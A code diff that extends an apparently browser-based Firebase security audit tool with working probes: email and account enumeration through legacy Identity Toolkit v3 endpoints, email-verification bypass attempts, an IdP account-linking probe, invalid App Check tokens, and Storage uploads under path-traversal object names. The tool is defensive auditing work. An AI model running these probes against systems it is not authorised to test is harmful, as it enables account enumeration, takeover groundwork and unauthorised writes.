@@ -112,6 +112,7 @@ requests (CORS). For a complete audit including those, use the companion Python 
 <div class="row"><span class="label">Upload HTML (XSS probe)</span><span class="status info" id="storageXssStatus">N/A</span></div>
 <div class="row"><span class="label">GCS IAM list (bypasses FB rules)</span><span class="status info" id="gcsIamStatus">N/A</span></div>
 <div class="row"><span class="label">Bucket metadata (location/class)</span><span class="status info" id="gcsMetaStatus">N/A</span></div>
+<div class="row"><span class="label">Path-scoping bypass (crafted name)</span><span class="status info" id="storageTravStatus">N/A</span></div>
 
 <h3>5. Cloud Functions (best-effort probe)</h3>
 <div class="row"><span class="label">Common names × regions</span><span class="status info" id="functionsStatus">N/A</span></div>
@@ -135,6 +136,14 @@ requests (CORS). For a complete audit including those, use the companion Python 
 <div class="row"><span class="label">FCM registration open?</span><span class="status info" id="fcmStatus">N/A</span></div>
 <div class="row"><span class="label">Firebase ML custom models</span><span class="status info" id="firebaseMlStatus">N/A</span></div>
 <textarea id="appIdValue" cols="100" rows="6" readonly placeholder="webConfig / App ID surface output"></textarea>
+
+<h3>10. Bypass & legacy endpoints</h3>
+<div class="row"><span class="label">v3 verifyPassword enum bypass</span><span class="status info" id="v3EnumStatus">N/A</span></div>
+<div class="row"><span class="label">v3 getAccountInfo unauth enum</span><span class="status info" id="v3InfoStatus">N/A</span></div>
+<div class="row"><span class="label">v3 signupNewUser emailVerified bypass</span><span class="status info" id="v3VerifiedStatus">N/A</span></div>
+<div class="row"><span class="label">v3 setAccountInfo self-verify</span><span class="status info" id="v3SetStatus">N/A</span></div>
+<div class="row"><span class="label">signInWithIdp linking/takeover probe</span><span class="status info" id="idpStatus">N/A</span></div>
+<div class="row"><span class="label">App Check soft-enforcement (bad token)</span><span class="status info" id="appCheckSoftStatus">N/A</span></div>
 
 <h3>Summary</h3>
 <div id="summary"></div>
@@ -997,6 +1006,153 @@ async function firebaseMlProbe() {
     }
 }
 
+/* ============================ 10. BYPASS & LEGACY ENDPOINTS ============================ */
+// Deprecated Identity Toolkit v3 endpoints frequently skip protections the v1 API enforces.
+const V3 = () => `https://www.googleapis.com/identitytoolkit/v3/relyingparty`;
+
+// v1 may return a generic INVALID_LOGIN_CREDENTIALS (enumeration protection). The legacy v3
+// verifyPassword often still returns granular EMAIL_NOT_FOUND / INVALID_PASSWORD -> bypass.
+async function v3EnumBypass() {
+    const url = `${V3()}/verifyPassword?key=${cfg.apiKey}`;
+    const r = await fetchJson(url, {method: "POST", headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({email: "probe_" + Date.now() + "@example.invalid", password: "x", returnSecureToken: true})});
+    const msg = (r.body && r.body.error && r.body.error.message) || "";
+    if (r.status === 0) { setStatus("v3EnumStatus", "CORS-blocked", "info"); return; }
+    if (/EMAIL_NOT_FOUND|INVALID_PASSWORD/.test(msg)) {
+        setStatus("v3EnumStatus", "VULNERABLE — legacy v3 leaks granular error (" + msg + ")", "bad");
+        finding("MEDIUM", "Email enumeration via legacy v3 verifyPassword",
+            "Deprecated identitytoolkit/v3 returns EMAIL_NOT_FOUND/INVALID_PASSWORD, bypassing v1 email-enumeration protection.");
+    } else if (/INVALID_LOGIN_CREDENTIALS/.test(msg)) {
+        setStatus("v3EnumStatus", "v3 also generic (protection covers legacy)", "ok");
+    } else {
+        setStatus("v3EnumStatus", msg ? msg.slice(0, 70) : ("HTTP " + r.status), "info");
+    }
+}
+
+// getAccountInfo with {email:[...]} and only the apiKey (no idToken). If records come back,
+// account info is enumerable unauthenticated.
+async function v3AccountInfoEnum() {
+    const url = `${V3()}/getAccountInfo?key=${cfg.apiKey}`;
+    const targets = ["admin@example.com", "test@example.com", "support@example.com"];
+    const r = await fetchJson(url, {method: "POST", headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({email: targets})});
+    if (r.status === 0) { setStatus("v3InfoStatus", "CORS-blocked", "info"); return; }
+    if (r.ok && r.body && r.body.users && r.body.users.length) {
+        const emails = r.body.users.map(u => u.email || u.localId).join(", ");
+        setStatus("v3InfoStatus", "VULNERABLE — unauth account info: " + emails, "bad");
+        finding("HIGH", "Unauthenticated account enumeration via v3 getAccountInfo",
+            "getAccountInfo returned records for " + emails + " with only the apiKey (no idToken).");
+    } else if (r.status === 400 && /MISSING|ID_TOKEN|CREDENTIAL/i.test(r.text)) {
+        setStatus("v3InfoStatus", "Requires idToken (not unauth-enumerable)", "ok");
+    } else {
+        setStatus("v3InfoStatus", "HTTP " + r.status, "info");
+    }
+}
+
+// signupNewUser exposes client-settable emailVerified. If honored, a pre-verified account is
+// created without the attacker owning the email.
+async function v3SignupVerifiedBypass() {
+    if (READ_ONLY) { setStatus("v3VerifiedStatus", "skipped (read-only)", "info"); return; }
+    const email = "verif_" + Date.now() + "@example.invalid";
+    const url = `${V3()}/signupNewUser?key=${cfg.apiKey}`;
+    const r = await fetchJson(url, {method: "POST", headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({email, password: "Str0ngP@ss!" + Date.now(), emailVerified: true, returnSecureToken: true})});
+    if (r.status === 0) { setStatus("v3VerifiedStatus", "CORS-blocked", "info"); return; }
+    if (r.ok && r.body && r.body.idToken) {
+        const look = await fetchJson(`https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=${cfg.apiKey}`,
+            {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({idToken: r.body.idToken})});
+        const verified = look.ok && look.body && look.body.users && look.body.users[0] && look.body.users[0].emailVerified;
+        if (verified) {
+            setStatus("v3VerifiedStatus", "BYPASS — client-set emailVerified:true honored", "bad");
+            finding("HIGH", "Email-verification bypass via v3 signupNewUser",
+                "signupNewUser accepted client-supplied emailVerified:true — a pre-verified account was created without owning the email.");
+        } else {
+            setStatus("v3VerifiedStatus", "signup ok, emailVerified ignored", "warn");
+            finding("LOW", "Open signup via legacy v3 signupNewUser", "Account created through deprecated v3 endpoint.");
+        }
+    } else {
+        const msg = (r.body && r.body.error && r.body.error.message) || ("HTTP " + r.status);
+        setStatus("v3VerifiedStatus", msg.slice(0, 70), "ok");
+    }
+}
+
+// setAccountInfo exposes emailVerified on the CURRENT account. If honored, self-verification.
+async function v3SetAccountVerified() {
+    if (READ_ONLY) { setStatus("v3SetStatus", "skipped (read-only)", "info"); return; }
+    if (!idToken) { setStatus("v3SetStatus", "no idToken (needs a session)", "info"); return; }
+    const url = `${V3()}/setAccountInfo?key=${cfg.apiKey}`;
+    const r = await fetchJson(url, {method: "POST", headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({idToken, emailVerified: true, returnSecureToken: true})});
+    if (r.status === 0) { setStatus("v3SetStatus", "CORS-blocked", "info"); return; }
+    if (r.ok && r.body && r.body.emailVerified === true) {
+        setStatus("v3SetStatus", "BYPASS — self emailVerified flipped to true", "bad");
+        finding("HIGH", "Self email-verification via v3 setAccountInfo",
+            "setAccountInfo honored client-supplied emailVerified:true on the current account.");
+    } else if (r.ok) {
+        setStatus("v3SetStatus", "setAccountInfo ok, emailVerified not honored", "ok");
+    } else {
+        const msg = (r.body && r.body.error && r.body.error.message) || ("HTTP " + r.status);
+        setStatus("v3SetStatus", msg.slice(0, 70), "ok");
+    }
+}
+
+// signInWithIdp/verifyAssertion linking behavior. A valid Google assertion can't be forged in the
+// browser, but needConfirmation / error classification reveals whether a target email already exists
+// under another provider (pre-account-takeover recon) and whether auto-linking is permitted.
+async function idpTakeoverProbe() {
+    const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithIdp?key=${cfg.apiKey}`;
+    const r = await fetchJson(url, {method: "POST", headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({requestUri: "http://localhost",
+            postBody: "providerId=google.com&id_token=invalid", returnIdpCredential: true, returnSecureToken: true})});
+    const msg = (r.body && r.body.error && r.body.error.message) || "";
+    if (r.status === 0) { setStatus("idpStatus", "CORS-blocked", "info"); return; }
+    if (r.ok && r.body && r.body.needConfirmation) {
+        setStatus("idpStatus", "needConfirmation — account exists under another provider", "warn");
+        finding("MEDIUM", "IdP account-linking confirmation exposed",
+            "verifyAssertion returned needConfirmation — target email exists with another provider (pre-account-takeover surface).");
+    } else if (/INVALID_IDP_RESPONSE|INVALID_CREDENTIAL_OR_PROVIDER_ID|MISSING_REQUEST_URI|INVALID_REQUEST_URI/i.test(msg)) {
+        setStatus("idpStatus", "Endpoint reachable (assertion validated server-side)", "info");
+    } else {
+        setStatus("idpStatus", msg ? msg.slice(0, 70) : ("HTTP " + r.status), "info");
+    }
+}
+
+// Send a clearly-invalid App Check token. If the request still succeeds, App Check is in
+// monitor / UNENFORCED mode for this resource and is bypassable with any token.
+async function appCheckSoftProbe() {
+    const url = `${FS_BASE()}/users?key=${cfg.apiKey}&pageSize=1`;
+    const r = await fetchJson(url, {headers: {"X-Firebase-AppCheck": "fbaudit-invalid-token", ...authHeaders()}});
+    if (r.status === 0) { setStatus("appCheckSoftStatus", "CORS-blocked", "info"); return; }
+    if (r.ok) {
+        setStatus("appCheckSoftStatus", "Garbage App Check token accepted — monitor/UNENFORCED mode", "bad");
+        finding("MEDIUM", "App Check soft-enforcement (monitor mode)",
+            "Firestore served a request carrying an invalid X-Firebase-AppCheck token — enforcement is not hard-blocking.");
+    } else if (r.status === 403 && /app.?check/i.test(r.text)) {
+        setStatus("appCheckSoftStatus", "Invalid token rejected — enforced", "ok");
+    } else {
+        setStatus("appCheckSoftStatus", "HTTP " + r.status + " (no App Check signal)", "info");
+    }
+}
+
+// Upload to crafted object names to test whether folder-scoped Storage rules (match /users/{uid}/..)
+// can be escaped via traversal-style keys.
+async function storageTraversalProbe() {
+    if (READ_ONLY) { setStatus("storageTravStatus", "skipped (read-only)", "info"); return; }
+    const names = [`users/${localId || "me"}/../admin/fbaudit_${Date.now()}.txt`, `%2e%2e%2ffbaudit_${Date.now()}.txt`];
+    const hits = [];
+    for (const n of names) {
+        const r = await storageUpload(n, "fbaudit-traversal", "text/plain");
+        if (r.ok) hits.push(n);
+    }
+    if (hits.length) {
+        setStatus("storageTravStatus", "Crafted-path WRITE accepted: " + hits.join(" | "), "bad");
+        finding("HIGH", "Storage path-scoping bypass",
+            "Upload accepted to a traversal-style object name — folder-scoped rules may be escapable: " + hits.join(", "));
+    } else {
+        setStatus("storageTravStatus", "Blocked", "ok");
+    }
+}
+
 /* ============================ ORCHESTRATOR ============================ */
 // FIX: run() previously reset READ_ONLY = false unconditionally, so the
 // "Read-Only Mode" button had no effect (it always performed writes).
@@ -1068,6 +1224,7 @@ async function run(readOnly = false) {
     await gcsBucketMeta();
     await storageUploadTest();
     await storageUploadXss();
+    await storageTraversalProbe();
 
     // 5. Functions
     await probeFunctions();
@@ -1084,6 +1241,14 @@ async function run(readOnly = false) {
     await appCheckProviderProbe();
     await fcmRegisterProbe();
     await firebaseMlProbe();
+
+    // 10. Bypass & legacy endpoints
+    await v3EnumBypass();
+    await v3AccountInfoEnum();
+    await v3SignupVerifiedBypass();
+    await v3SetAccountVerified();
+    await idpTakeoverProbe();
+    await appCheckSoftProbe();
 
     // summary counts
     const tally = {};
